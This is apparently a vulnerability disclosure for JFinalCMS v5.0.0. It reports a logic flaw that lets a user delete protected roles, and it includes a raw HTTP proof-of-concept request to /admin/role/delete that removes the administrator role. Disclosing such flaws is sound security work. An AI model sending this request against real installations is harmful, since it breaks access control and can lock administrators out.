
target:https://gitee.com/heyewei/JFinalcms

version:v5.0.0

There is a logical vulnerability in the system role management department,Can delete non removable roles.

![图片](https://github.com/5p4rk/cms/assets/24523653/65e0ecec-3bca-4cb7-b686-f99ded121008)

poc:

```
POST /admin/role/delete HTTP/1.1
Host: 192.168.247.187:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.247.187:8888/admin/role
Content-Length: 5
Cookie: JSESSIONID=BA544BEE02535ECDD1D19C15FE2187A2
DNT: 1
X-Forwarded-For: 8.8.8.8
Connection: close

ids=1
```

Through this interface, the administrator role can be directly deleted

![图片](https://github.com/5p4rk/cms/assets/24523653/2595a220-063e-4cdb-b1d2-d56fa154ab5e)


